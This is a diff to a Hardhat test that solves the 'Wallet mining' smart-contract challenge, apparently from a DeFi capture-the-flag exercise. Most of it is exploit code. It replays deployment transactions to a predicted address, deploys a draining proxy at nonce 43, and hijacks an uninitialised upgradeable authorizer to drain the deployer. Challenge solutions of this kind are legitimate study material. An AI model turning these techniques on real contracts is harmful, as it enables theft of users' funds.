@@ -3,6 +3,8 @@ const { expect } = require("chai");
 const { keccak256 } = require("ethers/lib/utils");
 const { showThrottleMessage } = require("@ethersproject/providers");
 const heplers = require("@nomicfoundation/hardhat-network-helpers");
+const { Factory, Copy, Upgrade } = require("./deployment.json");
+const { Contract } = require("ethers");
 
 describe("[Challenge] Wallet mining", function () {
   let deployer, player;
@@ -110,40 +112,57 @@ describe("[Challenge] Wallet mining", function () {
       }
     }
     /** Step 2: Deploy factory, master copy and deposit wallet contracts on target wallet based on nonce calculated from previous step */
-    const mockSigner = await ethers.getImpersonatedSigner(
-      "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A"
-    );
-    await heplers.setBalance(
-      mockSigner.address,
-      ethers.utils.parseEther("100")
-    );
+    // const mockSigner = await ethers.getImpersonatedSigner(
+    //   "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A"
+    // );
+    // await heplers.setBalance(
+    //   mockSigner.address,
+    //   ethers.utils.parseEther("100")
+    // );
+    let tx, res, deployer3;
+    deployer3 = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
+    tx = {
+      from: player.address,
+      to: deployer3,
+      value: ethers.utils.parseEther("1"),
+    };
 
-    const MockFactory = await ethers.getContractFactory(
-      "MockFactory",
-      mockSigner
-    );
+    await player.sendTransaction(tx);
 
-    let mockFactory, mockCopy;
+    let DeployedFactory, deployedFactory, deployedCopy;
+    deployedCopy = await (await ethers.provider.sendTransaction(Copy)).wait();
+    console.log("MasterCopy deployed at", deployedCopy.contractAddress);
 
-    for (let i = 0; i < 3; i++) {
-      let _mockFactory = await MockFactory.deploy({ gasLimit: 3000000 });
-      if (
-        _mockFactory.address == "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B"
-      ) {
-        mockFactory = _mockFactory;
-        console.log("mockFactory deployed at", mockFactory.address);
-      } else if (
-        _mockFactory.address == "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F"
-      ) {
-        console.log(_mockFactory);
-        mockCopy = _mockFactory;
-        console.log("mockCopy deployed at", mockCopy.address);
+    await (await ethers.provider.sendTransaction(Upgrade)).wait();
+
+    deployedFactory = await (
+      await ethers.provider.sendTransaction(Factory)
+    ).wait();
+    console.log("Factory deployed at", deployedFactory.contractAddress);
+    DeployedFactory = (
+      await ethers.getContractFactory("GnosisSafeProxyFactory")
+    ).attach(deployedFactory.contractAddress);
+
+    let depositWallet, MockWallet, mockWallet;
+    //Deploy mockWallet logic contract
+    MockWallet = await ethers.getContractFactory("MockWallet");
+    mockWallet = await MockWallet.deploy();
+    console.log("MockWallet deployed at", mockWallet.address);
+    //Deploy deposit wallet
+    let functionData = MockWallet.interface.encodeFunctionData("attack", [
+      token.address,
+      player.address,
+    ]);
+    for (let i = 1; i < 45; i++) {
+      if (i == 43) {
+        console.log("Draining funds from Deposit Wallet");
+        depositWallet = await DeployedFactory.createProxy(
+          mockWallet.address,
+          functionData
+        );
       }
+      depositWallet = await DeployedFactory.createProxy(mockWallet.address, []);
     }
-    //Deploy mockWallet contract at deposit wallet address and take user funds
-    await mockFactory.createWallet(token.address, player.address);
-
-    console.log(await token.balanceOf(player.address));
 
     /**Step 3: Take over Authorizer logic contract and upgrade it to fakeAuthorizer contract*/
 
@@ -161,9 +180,11 @@ describe("[Challenge] Wallet mining", function () {
     let abi = [`function attack()`];
     let iface = new ethers.utils.Interface(abi);
     let data = iface.encodeFunctionData("attack", []);
+
     await authorizerLogic
       .connect(player)
       .upgradeToAndCall(fakeAuthorizer.address, data);
+    console.log("Draining funds from Wallet Deployer");
     for (let i = 0; i < 43; i++) {
       await walletDeployer.connect(player).drop([]);
     }
